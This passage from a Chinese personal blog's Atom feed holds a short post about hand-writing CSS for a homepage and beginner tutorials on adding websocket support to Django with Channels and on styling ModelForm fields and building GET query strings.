    <category term="碎碎念" scheme="https://blog.snowflake.zone/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
  <entry>
    <title>记录第一次手搓css</title>
    <link href="https://blog.snowflake.zone/posts/14/"/>
    <id>https://blog.snowflake.zone/posts/14/</id>
    <published>2022-10-16T06:24:34.000Z</published>
    <updated>2022-10-16T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>手搓一次 css 以后，最大的感受就是：再也不想写 css 了。</p><span id="more"></span><h2 id="起因"><a class="markdownIt-Anchor" href="#起因"></a> 起因</h2><p>事情的起因是，<a href="https://bowenyoung.cn/">Bowen</a>跟我说，他用 tailwindcss 重新写了个主页，后来效果确实不错。看了看自己的主页，感觉有点太花里胡哨了。<s>其实早些时候我特别喜欢花里胡哨，现在可能年纪大了吧。</s> 后来看到了一位巨佬的主页，简洁得深得我心()。于是便仿照着极简的风格准备手搓。</p><h2 id="困难"><a class="markdownIt-Anchor" href="#困难"></a> 困难</h2><p>遇到的困难是，我在这之前 <emp>从来没有写过css</emp>。键盘上写下的每一行代码都是我最后的倔强。什么<code>margin</code>啊，<code>display</code>啊，彻底把我击垮了。问题在于，<strong>我甚至不能参考那位大佬的源码</strong>，用 react 写完生成的代码，甚至连一个 css 都没有。<span class="tag-plugin emoji"><img no-lazy="" class="inline" src="https://gcore.jsdelivr.net/gh/cdn-x/emoji/aru-l/11.gif"/></span> 接着就是各种翻手册、一点点尝试、打开各种连接找各种可能的解决方法。终于做出了初版：</p><div class="tag-plugin image"><div class="image-bg"><img src="https://s1.xptou.com/2022/10/16/634bb7791d227.jpg" alt="初版效果" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">初版效果</span></div></div><p>事情本该到此结束了，这个风格好看也算不上，但说丑也不至于(?)。但在手机端这个效果真的是拉垮，后来才发现，我所有的宽度什么的设置全部用了<code>px</code>。<mark class="tag-plugin colorful mark" color="red">大</mark><mark class="tag-plugin colorful mark" color="red">寄</mark><mark class="tag-plugin colorful mark" color="red">特</mark><mark class="tag-plugin colorful mark" color="red">寄</mark>了属于是。</p><h2 id="后来"><a class="markdownIt-Anchor" href="#后来"></a> 后来</h2><p>凌晨一点，揉着眼睛把 css 全部换了百分比，用 Bowen 的话说就是：</p><div class="tag-plugin quot"><p class="content" type="text"><span class="empty"></span><span class="text">最简单的响应式</span><span class="empty"></span></p></div><p>一想确实如此，低级是低级了点，反正一般人看前端也看不到我的代码(bushi)。</p><h2 id="结果"><a class="markdownIt-Anchor" href="#结果"></a> 结果</h2><p>现在已经正式作为<a href="https://i.snowflake.zone">个人主页</a>啦！感觉效果还不错，很干净。<psw>能力不支持复杂了</psw>不管怎么说也是第一次从零开始写 css，还是比较满意的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;手搓一次 css 以后，最大的感受就是：再也不想写 css 了。&lt;/p&gt;</summary>
    
    
    
    <category term="程序设计" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    <category term="框架" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E6%A1%86%E6%9E%B6/"/>
    
    
    <category term="css" scheme="https://blog.snowflake.zone/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>在django中实现websocket</title>
    <link href="https://blog.snowflake.zone/posts/13/"/>
    <id>https://blog.snowflake.zone/posts/13/</id>
    <published>2022-08-02T16:00:00.000Z</published>
    <updated>2022-08-02T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文在 django 中实现 websocket 协议。</p><span id="more"></span><h1 id="在-django-中使用-websocket"><a class="markdownIt-Anchor" href="#在-django-中使用-websocket"></a> 在 django 中使用 websocket</h1><p>  纯净的 django 是不支持 websocket 的，要想实现 websocket 协议，我们需要更改一些配置。</p><h2 id="step1-安装第三方包"><a class="markdownIt-Anchor" href="#step1-安装第三方包"></a> Step1: 安装第三方包</h2><p>  第三方包<code>channels</code>提供了在 django 中实现 websocket 通信协议的方式。我们安装这个包：</p><div class="tag-plugin copy"><input class="copy-area" id="copy_11" value="pip install channels"><button class="copy-btn" onclick="util.copy(&quot;copy_11&quot;,&quot;复制成功&quot;)"><svg class="icon copy-btn" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></button></div><p>然后，我们前往<code>settings.py</code>下注册这个 app：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">&#x27;django.contrib.admin&#x27;,</span><br><span class="line">&#x27;django.contrib.auth&#x27;,</span><br><span class="line">&#x27;django.contrib.contenttypes&#x27;,</span><br><span class="line">&#x27;django.contrib.sessions&#x27;,</span><br><span class="line">&#x27;django.contrib.messages&#x27;,</span><br><span class="line"></span><br><span class="line"><span class="deletion">- &#x27;django.contrib.staticfiles&#x27;</span></span><br><span class="line"></span><br><span class="line">* &#x27;django.contrib.staticfiles&#x27;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # MyApp</span><br><span class="line"></span><br><span class="line"><span class="deletion">-     &#x27;channels&#x27;</span></span><br><span class="line">  ]</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p><strong>一定要注意这里的逗号，千万不要遗漏</strong>，否则 django 会将没有被逗号分隔开的两个应用视作一个应用。</p><h2 id="step2-配置-asgi"><a class="markdownIt-Anchor" href="#step2-配置-asgi"></a> Step2: 配置 asgi</h2><p>  前往项目的<code>settings.py</code>下配置 asgi：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WSGI_APPLICATION = &#x27;&#123;ProjectName&#125;.wsgi.application&#x27;</span><br><span class="line"></span><br><span class="line"><span class="deletion">- ASGI_APPLICATION = &#x27;&#123;ProjectName&#125;.asgi.application&#x27;</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>然后前往<code>asgi.py</code>下更改默认配置，删除全部内容改写为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ASGI config for Project0728 project.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It exposes the ASGI callable as a module-level variable named `application`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">For more information on this file, see</span></span><br><span class="line"><span class="string">https://docs.djangoproject.com/en/4.0/howto/deployment/asgi/</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> django.core.asgi <span class="keyword">import</span> get_asgi_application</span><br><span class="line"><span class="keyword">from</span> channels.routing <span class="keyword">import</span> ProtocolTypeRouter, URLRouter</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> routings</span><br><span class="line"></span><br><span class="line">os.environ.setdefault(<span class="string">&#x27;DJANGO_SETTINGS_MODULE&#x27;</span>, <span class="string">&#x27;&#123;ProjectName&#125;.settings&#x27;</span>)</span><br><span class="line"></span><br><span class="line">application = ProtocolTypeRouter(&#123;</span><br><span class="line"><span class="string">&quot;http&quot;</span>: get_asgi_application(), <span class="comment"># http 路由列表</span></span><br><span class="line"><span class="string">&quot;websocket&quot;</span>: URLRouter(routings.websocket_urlpatterns), <span class="comment"># websocket 路由列表</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="step3-配置路由和视图类"><a class="markdownIt-Anchor" href="#step3-配置路由和视图类"></a> Step3: 配置路由和视图类</h2><p>  在<code>settings.py</code>同级目录下新建<code>routings.py</code>，其功能相当于<code>urls.py</code>，专门负责 websocket 协议的路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">routings.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> &#123;应用名称&#125; <span class="keyword">import</span> consumers</span><br><span class="line"></span><br><span class="line">websocket_urlpatterns = [</span><br><span class="line">path(<span class="string">&#x27;&#123;URL&#125;&#x27;</span>, consumers.&#123;视图类&#125;.as_asgi()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>  然后，前往需要使用到 websocket 的应用下新建<code>consumers.py</code>，其功能相当于<code>views.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> channels.generic.websocket <span class="keyword">import</span> WebsocketConsumer</span><br><span class="line"><span class="keyword">from</span> channels.exceptions <span class="keyword">import</span> StopConsumer</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> &#123;类名&#125;(WebsocketConsumer):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">websocket_connect</span>(<span class="params">self, message</span>):</span><br><span class="line">        <span class="comment"># 客户端发来链接请求后自动执行</span></span><br><span class="line">        <span class="comment"># 允许创建链接</span></span><br><span class="line">        <span class="variable language_">self</span>.accept()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">websocket_receive</span>(<span class="params">self, message</span>):</span><br><span class="line">        <span class="comment"># 客户端发来数据后自动执行</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">websocket_disconnect</span>(<span class="params">self, message</span>):</span><br><span class="line">        <span class="comment"># 客户端断开wb链接时自动触发</span></span><br><span class="line">        <span class="comment"># print(&quot;断开连接&quot;)</span></span><br><span class="line">        <span class="keyword">raise</span> StopConsumer()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上是默认的结构，当然，你可以在<code>routings.py</code>中配置多个路由，然后在<code>consumers.py</code>中声明多个类。</p><h2 id="运行程序并检查"><a class="markdownIt-Anchor" href="#运行程序并检查"></a> 运行程序并检查</h2><p>  此时我们运行程序，发现控制台输出变成了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">August 02, 2022 - 16:12:48</span><br><span class="line">Django version 4.0.6, using settings &#x27;Project0728.settings&#x27;</span><br><span class="line">Starting ASGI/Channels version 3.0.5 development server at http://127.0.0.1:8000/</span><br><span class="line">Quit the server with CTRL-BREAK.</span><br></pre></td></tr></table></figure><p>说明此时 django 项目同时支持 http 协议和 websocket 协议了。</p><h1 id="前后端数据交互"><a class="markdownIt-Anchor" href="#前后端数据交互"></a> 前后端数据交互</h1><h2 id="后端"><a class="markdownIt-Anchor" href="#后端"></a> 后端</h2><p>  后端对于 websocket 的操作相对较少，大多是对于数据的处理。主要用到的是<code>self.send()</code>和<code>self.close()</code>。</p><p>  <code>self.send()</code>，向建立连接的客户端发送数据，参数即为准备发送的数据。</p><p>  <code>self.close()</code>，服务端主动与客户端关闭连接。该函数被执行后，需要追加<code>return</code>停止函数继续运行。客户端接收到断开连接的请求后，客户端断开连接，同时，由于断开连接，服务端会自动执行<code>websocket_disconnect()</code>函数，然后抛出异常<code>StopConsumer()</code>，终止 websocket 连接。</p><h2 id="前端"><a class="markdownIt-Anchor" href="#前端"></a> 前端</h2><h3 id="创建-websocket-连接"><a class="markdownIt-Anchor" href="#创建-websocket-连接"></a> 创建 websocket 连接</h3><p>  前端可以主动与目标 url 创建 websocket 连接。首先需要新建一个<code>WebSocket</code>对象，初始化参数是目标 url。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://127.0.0.1:8000/room/123/&quot;</span>);</span><br></pre></td></tr></table></figure><p>该请求匹配到后端的路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path(<span class="string">&quot;room/&lt;int&gt;/&quot;</span>,consumers.ChatRoom.as_asgi())</span><br></pre></td></tr></table></figure><p>于是执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">consumers.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChatRoom</span>(<span class="title class_ inherited__">WebsocketConsumer</span>):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">websocket_connect</span>(<span class="params">self, message</span>):</span><br><span class="line"><span class="variable language_">self</span>.accept() <span class="comment"># 执行这句语句，即连接创建成功</span></span><br></pre></td></tr></table></figure><p>  此时，前端可以使用<code>ws.send()</code>发送数据了。</p><h3 id="回调函数"><a class="markdownIt-Anchor" href="#回调函数"></a> 回调函数</h3><p>  当发生<strong>连接请求</strong>、<strong>传递数据</strong>、<strong>断开连接请求</strong>时，后端都有对应的函数会自动执行，前端也如此。这被称为<strong>回调函数</strong>。回调函数在满足条件后自动触发，JavaScript 中可以为 websocket 绑定三种回调函数。</p><p>  如果<code>ws</code>是 websocket 的一个实例化对象，那么可以使用<code>ws.onopen</code>、<code>ws.onmessage</code>、<code>ws.onclose</code>绑定函数。例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ws.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> tag = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">tag.<span class="property">innerText</span> = event.<span class="property">data</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;msg&quot;</span>).<span class="title function_">appendChild</span>(tag);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;已展示最新数据&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述函数在后端主动发送数据后被自动执行，结果是向 id 为<code>msg</code>的块级内容写入新的元素。其中，<code>event</code>封装了后端发送的所有数据，利用<code>event.data</code>可以提取出数据。</p><p>  更多地，<code>onopen</code>发生在建立连接后，<code>onclose</code>发生在收到后端关闭连接请求后。</p><h1 id="多客户端的管理聊天室为例"><a class="markdownIt-Anchor" href="#多客户端的管理聊天室为例"></a> 多客户端的管理：聊天室为例</h1><h2 id="更改配置文件"><a class="markdownIt-Anchor" href="#更改配置文件"></a> 更改配置文件</h2><p>  使用 channel_layers，可以对同时连接的多个客户端进行管理。相关的数据需要被写入内存当中，因此需要在配置文件中添加：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">settings.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">CHANNEL_LAYERS = &#123;</span><br><span class="line"><span class="string">&quot;default&quot;</span>: &#123;</span><br><span class="line"><span class="string">&quot;BACKEND&quot;</span>: <span class="string">&quot;channels.layers.InMemoryChannelLayer&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="将新连接的客户端写入内存中"><a class="markdownIt-Anchor" href="#将新连接的客户端写入内存中"></a> 将新连接的客户端写入内存中</h2><p>  我们需要将新建立的连接写入内存。对实例对象调用<code>channel_layer.group_add()</code>方法。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> asgiref.sync <span class="keyword">import</span> async_to_sync</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">websocket_connect</span>(<span class="params">self, message</span>): <span class="comment"># 将连接加入组中，self.channel_name 表示在该组中该连接的名称。</span></span><br><span class="line">async_to_sync(<span class="variable language_">self</span>.channel_layer.group_add)(&#123;加入的组名&#125;, <span class="variable language_">self</span>.channel_name)</span><br></pre></td></tr></table></figure><p>其中，<strong>由于上述方法只支持异步，然而我们并没有编写异步代码，因此需要使用同步的方式完成该操作</strong>。<code>asnyc_to_sync</code>是将方法由异步转变成为同步。</p><p>  获得新消息时，对同一组内所有连接群发消息，可以使用<code>group_send()</code>完成。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">websocket_message</span>(<span class="params">self, message</span>): <span class="comment"># 对组名中所有连接对象调用方法名所对应的方法，字典作为参数传入</span></span><br><span class="line">async_to_sync(<span class="variable language_">self</span>.channel_layer.group_send)(&#123;组名&#125;,&#123;<span class="string">&quot;type&quot;</span>: &#123;方法名&#125;,<span class="string">&quot;message&quot;</span>: message&#125;)</span><br></pre></td></tr></table></figure><p>如果方法定义为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> &#123;方法名&#125;(<span class="variable language_">self</span>, event):</span><br><span class="line"><span class="variable language_">self</span>.send(event[<span class="string">&#x27;message&#x27;</span>][<span class="string">&#x27;text&#x27;</span>])</span><br></pre></td></tr></table></figure><p>也就意味着对群组内所有连接都发送<code>message['text']</code>。</p><p>  断开连接时，需要从组内同时剔除该连接。可以使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">websocket_disconnect</span>(<span class="params">self, message</span>):</span><br><span class="line">async_to_sync(<span class="variable language_">self</span>.channel_layer.group_discard)(&#123;组名&#125;, <span class="variable language_">self</span>.channel_name)</span><br></pre></td></tr></table></figure><p>这样，当连接终止时，自动触发<code>websocket_disconnect</code>，该连接就从 group 中被剔除了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文在 django 中实现 websocket 协议。&lt;/p&gt;</summary>
    
    
    
    <category term="程序设计" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    <category term="框架" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E6%A1%86%E6%9E%B6/"/>
    
    
    <category term="django" scheme="https://blog.snowflake.zone/tags/django/"/>
    
    <category term="python" scheme="https://blog.snowflake.zone/tags/python/"/>
    
    <category term="websocket" scheme="https://blog.snowflake.zone/tags/websocket/"/>
    
  </entry>
  
  <entry>
    <title>django笔记(4)：为ModelForm表单添加样式、如何拼接GET参数</title>
    <link href="https://blog.snowflake.zone/posts/12/"/>
    <id>https://blog.snowflake.zone/posts/12/</id>
    <published>2022-07-31T16:00:00.000Z</published>
    <updated>2022-07-31T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>为 django 中的 modelform 添加样式。</p><span id="more"></span><h1 id="写在前面"><a class="markdownIt-Anchor" href="#写在前面"></a> 写在前面</h1><p>  最近的开发学习碰到了两个比较重要的知识点：ModelForm 表单和后端 URL 拼接。这两点不算太难但也比较复杂，并且在后续开发也很常用。<s>常不常用我不知道，反正我第一次是写懵了</s>所以在这里总结一下这部分知识点。</p><h1 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h1><h2 id="modelform-表单"><a class="markdownIt-Anchor" href="#modelform-表单"></a> ModelForm 表单</h2><p>  得益于 ModelForm 表单，我们不必在前端写复杂的 html 代码来实现表单。我们只需要一个简单的循环，以及对每一个字段的引用就可以做到了：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">novalidate</span>&gt;</span></span><br><span class="line">  &#123;% csrf_token %&#125; &#123;% for field in form %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;exampleInputEmail1&quot;</span>&gt;</span>&#123;&#123; field.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    &#123;&#123;field&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;color: red&quot;</span>&gt;</span>&#123;&#123; field.errors.0 &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-success&quot;</span>&gt;</span>确认提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>  但是正是因为<code>input</code>框由 django 的 ModelForm 为我们自动生成，为其添加样式(例如 BootStrap)就变得比较困难。在 django 中存在解决这个问题的途径。</p><h3 id="第一种修改-modelform-类的-widget-属性"><a class="markdownIt-Anchor" href="#第一种修改-modelform-类的-widget-属性"></a> 第一种：修改 ModelForm 类的 widget 属性</h3><p>  widget 属性决定了每一个字段通过 django 渲染出的 html 代码格式。例如要为<code>username</code>字段添加<code>class=&quot;form-control&quot;</code>的类名，那么我们就可以在定义 ModelForm 类时：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ExampleModelForm</span>(models.ModelForm):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">        model = models.Administrator</span><br><span class="line">        fields = [<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        widgets = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: forms.CharField(attrs=&#123;<span class="string">&quot;class&quot;</span>:<span class="string">&quot;form-control&quot;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  在字典中我们还可以添加其他键值关系，这样在前端渲染<code>input</code>时，就会带上我们所指定的<code>class=&quot;form-control&quot;</code>。同样的，在 widgets 字典中还可以指定多个字段自己的 widget 属性。</p><p>  但是这样做会带来一个问题，例如我们对所有输入框都要应用 BootStrap 的样式，那么在 widgets 中逐个添加是否有些繁琐了呢？当然，我们也有办法解决这个问题。</p><h3 id="第二种重写init方法"><a class="markdownIt-Anchor" href="#第二种重写init方法"></a> 第二种：重写<strong>init</strong>方法</h3><p>在创造这个<code>ExampleModelForm</code>类时，其存在默认的<code>__init__(self)</code>方法。我们重写这个方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BootStrapModelForm</span>(forms.ModelForm):</span><br><span class="line"><span class="keyword">def</span> **init**(<span class="variable language_">self</span>, *args, \*\*kwargs):</span><br><span class="line"><span class="built_in">super</span>().**init**(*args, \*\*kwargs) <span class="comment"># 循环每个字段为其插件进行设置</span></span><br><span class="line"><span class="keyword">for</span> name, field <span class="keyword">in</span> <span class="variable language_">self</span>.fields.items(): <span class="comment"># 字段中有属性，则增加</span></span><br><span class="line"><span class="keyword">if</span> field.widget.attrs:</span><br><span class="line">field.widget.attrs[<span class="string">&quot;class&quot;</span>] = <span class="string">&quot;form-control&quot;</span></span><br><span class="line">field.widget.attrs[<span class="string">&quot;placeholder&quot;</span>] = field.label</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">field.widget.attrs = &#123;</span><br><span class="line"><span class="string">&quot;class&quot;</span>: <span class="string">&quot;form-control&quot;</span>, <span class="comment"># 还可以添加其他的标签，例如 placeholder</span></span><br><span class="line"><span class="string">&quot;placeholder&quot;</span>: field.label</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  对上述代码做出一些解释。<code>super().__init__(*args,**kwargs)</code>是必须执行的，其初始化父类。然后，我们对存在的所有字段进行遍历，并对其中的<code>field</code>设置<code>widget</code>。其中，判断句<code>if</code>是为了防止覆盖原本的<code>attrs</code>属性。对于重写后的<code>__init__(self)</code>方法，我们可以单独将其作为一个父类，之后需要使用的所有 ModelForm 都改为继承此父类即可。</p><h2 id="拼接-url"><a class="markdownIt-Anchor" href="#拼接-url"></a> 拼接 URL</h2><p>  在访问 url 时，许多网站采用 GET 方式传参，这种参数一般显式地拼接在 url 后，例如</p><div class="tag-plugin colorful note" ><div class="body"><p><a href="https://127.0.0.1:8000/index/?page=4">https://127.0.0.1:8000/index/?page=4</a></p></div></div><p>在开发中，这样的参数可能不止一个，对于多个参数，在点击超链接时为了防止参数的损失，解决方式之一就是对超链接进行后端的拼接。django 自然也支持这个操作。例如我们需要对上述 url 拼接一个<code>key=12</code>的参数使得其能够携带两个参数，我们首先要获取已有的参数。在访问 url 时，<code>request</code>变量会携带所有与这次 url 访问有关的信息，因此，我们要从这里动手脚。当然，出于保护机制，django 不允许直接修改<code>request</code>的值，因此，我们需要拷贝一份。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query_dict = copy.deepcopy(request.GET)</span><br></pre></td></tr></table></figure><p>  说明一下上一行代码：<code>request.GET</code>携带了以 GET 方式传递的所有参数，其类型是一个字典。然后，我们要对<code>query_dict</code>添加键值关系，<code>setlist()</code>方法支持这种操作。例如我们来添加<code>key=12</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query_dict.setlist(<span class="string">&quot;key&quot;</span>, <span class="number">12</span>)</span><br></pre></td></tr></table></figure><p>  这样，新的键值关系就被我们添加完成了。此时<code>query_dict</code>的值应该是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">query_dict = 